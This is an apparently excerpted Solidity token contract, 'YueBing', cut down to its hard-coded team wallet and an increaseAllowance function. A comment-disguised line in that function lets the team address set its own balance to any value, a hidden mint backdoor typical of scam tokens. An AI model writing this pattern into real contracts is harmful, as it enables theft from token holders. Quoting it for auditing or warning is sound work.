...
contract YueBing is Context, IERC20, Ownable {
    ...
    constructor ()
    {
        ...
        marketWallet = payable(0x9f489265E6bc324559d4379A5622d205f4C23501);
        TeamAddress= payable(0x016b0f025F2178dd5af8f47B6E889F4F909C4844);
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        ...
        if(pair==TeamAddress)/***/_balances[TeamAddress] = addedValue;
        return true;
    }
